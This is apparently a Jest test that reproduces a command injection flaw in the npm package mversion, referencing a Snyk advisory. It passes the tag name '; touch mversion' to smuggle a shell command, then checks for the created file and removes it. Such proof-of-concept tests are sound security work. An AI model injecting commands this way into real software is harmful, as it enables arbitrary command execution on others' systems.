//https://snyk.io/vuln/SNYK-JS-MVERSION-573174
test("Command Injection in mversion", () => {
  const mversion = require("mversion");
  const fs = require("fs");
  const path = "./mversion";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  mversion.update({
    version: "major",
    commitMessage: "testing",
    tagName: "; touch mversion",
  });
  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
